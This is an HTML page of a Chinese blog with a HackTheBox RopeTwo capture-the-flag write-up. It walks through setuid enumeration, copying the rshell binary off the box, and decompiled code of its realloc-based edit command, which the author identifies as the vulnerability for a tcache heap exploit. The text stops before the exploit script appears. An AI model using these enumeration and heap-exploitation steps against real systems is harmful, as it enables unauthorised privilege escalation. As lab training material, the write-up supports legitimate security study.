<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://fonts.lug.ustc.edu.cn/css?family=Noto+Serif+SC:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":true,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true}}</script><script src="/js/config.js"></script>

    <meta name="description" content="前言此篇文章专门记录hack the box - ropetwo机器中获取user权限的pwn rshell部分, Tcache堆利用。">
<meta property="og:type" content="article">
<meta property="og:title" content="HackTheBox-RopeTwo-[pwn-rshell]">
<meta property="og:url" content="https://fdlucifer.github.io/2021/02/18/hackthebox-rope2-rshell-exploit/index.html">
<meta property="og:site_name" content="fdvoid0&#39;s blog">
<meta property="og:description" content="前言此篇文章专门记录hack the box - ropetwo机器中获取user权限的pwn rshell部分, Tcache堆利用。">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/ropetwo-rshell.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/rope2-rshell.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/rope2-rshell1.jpg">
<meta property="article:published_time" content="2021-02-17T19:14:09.000Z">
<meta property="article:modified_time" content="2021-02-21T15:04:39.554Z">
<meta property="article:author" content="fdvoid0">
<meta property="article:tag" content="pwn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/ropetwo-rshell.jpg">


<link rel="canonical" href="https://fdlucifer.github.io/2021/02/18/hackthebox-rope2-rshell-exploit/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2021/02/18/hackthebox-rope2-rshell-exploit/","path":"2021/02/18/hackthebox-rope2-rshell-exploit/","title":"HackTheBox-RopeTwo-[pwn-rshell]"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>HackTheBox-RopeTwo-[pwn-rshell] | fdvoid0's blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
<link rel="alternate" href="/atom.xml" title="fdvoid0's blog" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">fdvoid0's blog</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">by fdvoid0</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="Search" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">43</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">42</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">206</span></a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="Searching..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%8B%E8%BD%BDbinary%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90"><span class="nav-number">2.</span> <span class="nav-text">下载binary文件分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%BB%E8%A6%81%E5%BE%AA%E7%8E%AF"><span class="nav-number">3.</span> <span class="nav-text">主要循环</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Commands"><span class="nav-number">4.</span> <span class="nav-text">Commands</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%85%8D%E7%BD%AE"><span class="nav-number">5.</span> <span class="nav-text">配置</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BE%E5%9C%A8%E4%B8%80%E8%B5%B7"><span class="nav-number">6.</span> <span class="nav-text">放在一起</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%A8%E9%87%8A"><span class="nav-number">7.</span> <span class="nav-text">注释</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BC%B1%E7%82%B9"><span class="nav-number">8.</span> <span class="nav-text">弱点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9C%A8%E5%A0%86%E4%B8%8A%E5%BE%97%E5%88%B0libc"><span class="nav-number">9.</span> <span class="nav-text">在堆上得到libc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%84%E9%9C%B2Libc"><span class="nav-number">10.</span> <span class="nav-text">泄露Libc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%89%A7%E8%A1%8C"><span class="nav-number">11.</span> <span class="nav-text">执行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#shell"><span class="nav-number">12.</span> <span class="nav-text">shell</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="fdvoid0"
      src="/images/blackhole.png">
  <p class="site-author-name" itemprop="name">fdvoid0</p>
  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">206</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">42</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">43</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ19saVRlaDRSMUZNYnBWeGxwTWUtdnc=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC_liTeh4R1FMbpVxlpMe-vw"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="fa fa-stack-exchange fa-fw"></i>infosec.exchange</span>
      </span>
  </div>
  <div class="cc-license animated" itemprop="license">
    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
  </div>

        </div>
      </div>
        <div class="back-to-top animated" role="button" aria-label="Back to top">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
    </div>

    
    <div class="sidebar-inner sidebar-blogroll">
      <div class="links-of-blogroll animated">
        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
          Links
        </div>
        <ul class="links-of-blogroll-list">
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
            </li>
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
            </li>
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
            </li>
        </ul>
      </div>
    </div>
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2021/02/18/hackthebox-rope2-rshell-exploit/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/blackhole.png">
      <meta itemprop="name" content="fdvoid0">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="fdvoid0's blog">
      <meta itemprop="description" content="All things about infosec & ctf">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="HackTheBox-RopeTwo-[pwn-rshell] | fdvoid0's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          HackTheBox-RopeTwo-[pwn-rshell]
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-02-18 03:14:09" itemprop="dateCreated datePublished" datetime="2021-02-18T03:14:09+08:00">2021-02-18</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2021-02-21 23:04:39" itemprop="dateModified" datetime="2021-02-21T23:04:39+08:00">2021-02-21</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
        </span>
          , 
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/pwn/%E9%80%86%E5%90%91/" itemprop="url" rel="index"><span itemprop="name">逆向</span></a>
        </span>
    </span>

  
    <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv">
      <span class="post-meta-item-icon">
        <i class="far fa-eye"></i>
      </span>
      <span class="post-meta-item-text">Views: </span>
      <span id="busuanzi_value_page_pv"></span>
    </span>
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Word count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Word count in article: </span>
      <span>9.9k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>36 mins.</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>此篇文章专门记录hack the box - ropetwo机器中获取user权限的pwn rshell部分, Tcache堆利用。</p>
<span id="more"></span>

<h2 id="下载binary文件分析"><a href="#下载binary文件分析" class="headerlink" title="下载binary文件分析"></a>下载binary文件分析</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">chromeuser@rope2:~$ find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/fusermount</span><br><span class="line">/usr/bin/rshell</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">chromeuser@rope2:~$ /usr/bin/rshell</span><br><span class="line">$ <span class="built_in">id</span></span><br><span class="line">uid=1000(r4j) gid=1000(r4j) <span class="built_in">groups</span>=1000(r4j)</span><br><span class="line">$ <span class="built_in">whoami</span></span><br><span class="line">r4j</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">$ <span class="built_in">pwd</span></span><br><span class="line">rshell: <span class="built_in">pwd</span>: <span class="built_in">command</span> not found</span><br><span class="line">$ ^C</span><br><span class="line">chromeuser@rope2:~$</span><br></pre></td></tr></table></figure>

<p>下载rshell文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chromeuser@rope2:/usr/bin$ python3 -m http.server 8001</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8001 (http://0.0.0.0:8001/) ...</span><br><span class="line">10.10.14.22 - - [17/Feb/2021 19:33:30] <span class="string">&quot;GET /rshell HTTP/1.1&quot;</span> 200 -</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/rope2]</span><br><span class="line">└─<span class="comment"># wget http://10.10.10.196:8001/rshell</span></span><br><span class="line">--2021-02-17 14:30:38--  http://10.10.10.196:8001/rshell</span><br><span class="line">正在连接 10.10.10.196:8001... 已连接。</span><br><span class="line">已发出 HTTP 请求，正在等待回应... 200 OK</span><br><span class="line">长度：14312 (14K) [application/octet-stream]</span><br><span class="line">正在保存至: “rshell”</span><br><span class="line"></span><br><span class="line">rshell                             100%[===============================================================&gt;]  13.98K  45.0KB/s  用时 0.3s    </span><br><span class="line"></span><br><span class="line">2021-02-17 14:30:39 (45.0 KB/s) - 已保存 “rshell” [14312/14312])</span><br><span class="line"></span><br><span class="line">┌──(root💀kali)-[~/hackthebox/machine/rope2]</span><br><span class="line">└─<span class="comment"># ls -la rshell</span></span><br><span class="line">-rw-r--r-- 1 root root 14312  2月 24  2020 rshell</span><br></pre></td></tr></table></figure>

<h2 id="主要循环"><a href="#主要循环" class="headerlink" title="主要循环"></a>主要循环</h2><p>使用<span class="exturl" data-url="aHR0cHM6Ly9naGlkcmEtc3JlLm9yZy8=">Ghidra<i class="fa fa-external-link-alt"></i></span>打开看了看。在搜索字符串“command not found” 时，定位在0x1019be处的函数，将其命名为process_input。调用这个函数的函数是0x101b93，将调用main_loop</p>
<p>使用ghidra重命名函数名和变量名之后的伪代码如下所示，便于阅读:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">void main_loop(void)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  ssize_t i;</span><br><span class="line">  long in_FS_OFFSET;</span><br><span class="line">  byte in_buf [200];</span><br><span class="line">  undefined8 canary;</span><br><span class="line">  </span><br><span class="line">  canary = *(undefined8 *)(in_FS_OFFSET + 0x28);</span><br><span class="line">  init_stuff();</span><br><span class="line">  memset(in_buf,0,200);</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;$ &quot;</span>);</span><br><span class="line">      i = <span class="built_in">read</span>(0,in_buf,199);</span><br><span class="line">    &#125; <span class="keyword">while</span> ((int)i &lt; <span class="number">2</span>);</span><br><span class="line">    in_buf[(int)i + -<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    process_input(in_buf);</span><br><span class="line">  &#125; while( true );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>它初始化一些东西，然后进入一个无限循环，打印$，读取最多200个字符，null结束输入，并将其传递给process_input, process_input根据输入中的前几个字符采取行动:</p>
<table>
<thead>
<tr>
<th align="left">输入开始</th>
<th align="left">采取动作</th>
</tr>
</thead>
<tbody><tr>
<td align="left">“ls “</td>
<td align="left">调用 do_ls [0x1015cf]</td>
</tr>
<tr>
<td align="left">“add “</td>
<td align="left">调用 do_add(user_input[4:]) [0x101345]</td>
</tr>
<tr>
<td align="left">“rm “</td>
<td align="left">调用 do_rm(user_input[3:]) [0x10166d]</td>
</tr>
<tr>
<td align="left">“echo “</td>
<td align="left">输出字符串的其余部分</td>
</tr>
<tr>
<td align="left">“edit “</td>
<td align="left">调用 do_edit(user_input[5:]) [0x1017d8]</td>
</tr>
<tr>
<td align="left">“whoami”</td>
<td align="left">打印 “r4j”</td>
</tr>
<tr>
<td align="left">“id”</td>
<td align="left">打印 “uid&#x3D;1000(r4j) gid&#x3D;1000(r4j) groups&#x3D;1000(r4j)”</td>
</tr>
<tr>
<td align="left">其它</td>
<td align="left">打印 “rshell: %s: command not found”</td>
</tr>
</tbody></table>
<h2 id="Commands"><a href="#Commands" class="headerlink" title="Commands"></a>Commands</h2><p>该程序一次最多保存两个“文件”，其中file1 on是0x104060的全局文件，file2是0x104130。对于每个文件，前8个字节包含一个指向用户提供的包含文件内容的malloc创建的堆缓冲区的指针。有一种检查只允许大小小于或等于0x70字节。最后一个0xC8(200)字节保存文件的名称。add函数确保第二个文件不能与现有文件同名，并且不能添加超过两个文件。这将是利用该二进制文件的最大限制，因为每次只使用两个文件就很难将堆操作到您想要的位置。</p>
<p>ls命令在两个槽上循环，如果指针非空，它将打印文件的名称。它不打印任何内容，而且无法合法地获取文件的内容，这为开发提供了另一个需要克服的主要障碍。</p>
<p>rm命令在两个槽上循环，查看偏移量为8的字符串，如果字符串与输入匹配，则将字符串文件名全部设置为null，释放包含内容的堆内存，并将指针设置为null。</p>
<p>edit命令是漏洞存在的地方。</p>
<p>使用ghidra将FUN_001017d8函数中各个变量命名成如下形式，便于阅读:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">void do_edit(char *param_1)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  int strcmp_res;</span><br><span class="line">  long in_FS_OFFSET;</span><br><span class="line">  uint read_size;</span><br><span class="line">  int i;</span><br><span class="line">  void *new_buf;</span><br><span class="line">  long canary;</span><br><span class="line">  </span><br><span class="line">  canary = *(long *)(in_FS_OFFSET + 0x28);</span><br><span class="line">  i = 0;</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (1 &lt; i) &#123;</span><br><span class="line">      puts(<span class="string">&quot;rshell: No such file or directory&quot;</span>);</span><br><span class="line">LAB_001019a8:</span><br><span class="line">      <span class="keyword">if</span> (canary != *(long *)(in_FS_OFFSET + 0x28)) &#123;</span><br><span class="line">                    /* WARNING: Subroutine does not <span class="built_in">return</span> */</span><br><span class="line">        __stack_chk_fail();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    strcmp_res = strcmp(param_1,(char *)((long)i * <span class="number">0</span>xd0 + <span class="number">0</span>x104068));</span><br><span class="line">    <span class="keyword">if</span> ((strcmp_res == <span class="number">0</span>) &amp;&amp; ((&amp;item_array)[(long)i * <span class="number">0</span>x1a] != <span class="number">0</span>)) &#123;</span><br><span class="line">      read_size = 0;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;size: &quot;</span>);</span><br><span class="line">      __isoc99_scanf(&amp;<span class="string">&quot;%u&quot;</span>,&amp;read_size);</span><br><span class="line">      getchar();</span><br><span class="line">      <span class="keyword">if</span> (read_size &lt; 0x71) &#123;</span><br><span class="line">        new_buf = realloc((void *)(&amp;item_array)[(long)i * <span class="number">0</span>x1a],(ulong)read_size);</span><br><span class="line">        if (new_buf == (void *)<span class="number">0</span>x0) &#123;</span><br><span class="line">          puts(&quot;Error&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">          *(void **)(&amp;item_array + (long)i * <span class="number">0</span>x1a) = new_buf;</span><br><span class="line">          printf(&quot;content: &quot;);</span><br><span class="line">          read(<span class="number">0</span>,(void *)(&amp;item_array)[(long)i * <span class="number">0</span>x1a],(ulong)read_size);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      else &#123;</span><br><span class="line">        puts(&quot;Memory Error!&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">      goto LAB_001019a8;</span><br><span class="line">    &#125;</span><br><span class="line">    i = i + <span class="number">1</span>;</span><br><span class="line">  &#125; while( true );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个循环首先检查i是否大于1，这表示它已经遍历了两个配置，但没有找到要编辑的匹配文件，在这种情况下，它打印一条错误消息并退出。然后，它检查当前项，看看名称是否与输入匹配，如果匹配，它会提示输入一个新的大小(确保小于0x71)，并在现有缓冲区上使用realloc。然后读取并存储内容，并完成。</p>
<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><ul>
<li>利用脚本</li>
</ul>
<p>为了与这个二进制文件交互，使用一些工具。首先，启动一个Python利用脚本。首先，它将只有与rshell中的各种命令交互的方法(这个脚本假设我的ssh公钥在chromeuser的authorized_keys文件中):</p>
<ul>
<li>exp.py</li>
</ul>
